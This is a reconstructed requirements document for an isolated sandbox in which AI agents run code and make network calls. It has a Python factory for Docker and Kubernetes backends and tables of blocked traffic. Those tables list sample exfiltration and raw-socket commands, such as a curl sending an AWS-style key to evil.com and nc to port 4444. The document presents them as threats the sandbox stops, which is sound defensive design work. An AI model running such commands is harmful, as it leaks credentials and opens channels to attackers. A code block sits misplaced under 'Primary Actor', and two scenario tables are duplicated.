---
title: "Agent Sandbox Historical Requirements Reconstruction"
created: 2026-02-25
implemented: 2026-03-23
tags: [documentation, historical-reconstruction, migration]
document_role: primary
document_type: requirements
snapshot_id: sandbox-260225
historical_reconstruction: true
migration_source: "docs/azents/design/agent-sandbox.md"
---

# Agent Sandbox Historical Requirements Reconstruction

> This is a provenance-marked historical reconstruction, not newly approved product intent.
> It contains only statements recoverable from the source document. Unknown intent remains explicitly unknown.

- Snapshot: `sandbox-260225`
- Source: `docs/azents/design/sandbox-260225-sandbox.md`
- Historical source date basis: `2026-02-25`
- Requester confirmation of the historical reconstruction: not recorded; confirmation is required before treating this as approved intent.

## Problem

Provides an isolated execution environment (Sandbox) where nointern agents can perform **code execution, file manipulation, external API calls**, and similar work.

## Primary Actor

def create_sandbox(
    config: SandboxConfig,
    allowed_domains: list[str],
    denied_domains: list[str],
) -> Sandbox:
    """Create appropriate Sandbox implementation based on config."""
    match config.backend:
        case "docker":
            return DockerSandbox(
                image=config.docker_image,
                network=config.docker_network,
                allowed_domains=allowed_domains,
                denied_domains=denied_domains,
            )
        case "k8s":
            return K8sSandbox(
                namespace=config.k8s_namespace,
                warm_pool=config.k8s_warm_pool,
                allowed_domains=allowed_domains,
                denied_domains=denied_domains,
            )
```

Use Docker container with `SANDBOX_BACKEND=docker` in local development and K8s WarmPool with `SANDBOX_BACKEND=k8s` in deployment environments. Engine Worker code runs the same without changes.

## Primary Scenario

| Scenario | Handling |
|----------|------|
| `curl https://pypi.org/...` | domain allowed → pass |
| `curl https://evil.com/exfil?key=AKIA...` | domain mismatch → block |
| `nc 10.0.0.1 5432` (internal DB) | Private IP → NetworkPolicy DROP (K8s) / bridge isolation (Docker) |
| `nc 1.2.3.4 4444` (raw TCP) | redirected to proxy → no domain → block |
| `python -c "socket.connect(...)"` | same as above → block |

## Supporting Scenarios

| Scenario | Handling |
|----------|------|
| `curl https://pypi.org/...` | domain allowed → pass |
| `curl https://evil.com/exfil?key=AKIA...` | domain mismatch → block |
| `nc 10.0.0.1 5432` (internal DB) | Private IP → NetworkPolicy DROP (K8s) / bridge isolation (Docker) |
| `nc 1.2.3.4 4444` (raw TCP) | redirected to proxy → no domain → block |
| `python -c "socket.connect(...)"` | same as above → block |

## Goals

Unknown — the historical source does not state this explicitly.

## Non-goals

Unknown — the historical source does not state this explicitly.

## Requirements

| Requirement | Description |
|----------|------|
| **Isolation** | Agent code cannot access host/internal services |
| **Network security** | Block private IPs + domain whitelist (per customer) |
| **Data exfiltration prevention** | Inspect all outbound traffic with MITM proxy |
| **Usage measurement** | Measure CPU/memory/time per Pod → customer billing |
| **Fast boot** | Sub-second allocation through Warm Pool |
| **AWS credits** | Handle all infrastructure cost with AWS credits |

## Fixed Constraints

Unknown — the historical source does not state this explicitly.

## Open Assumptions

Unknown — the historical source does not state this explicitly.

## Historical Unknowns

- Explicit requester confirmation and original acceptance criteria are unknown unless stated above.
- Any product intent not quoted or paraphrased from the source remains unknown.
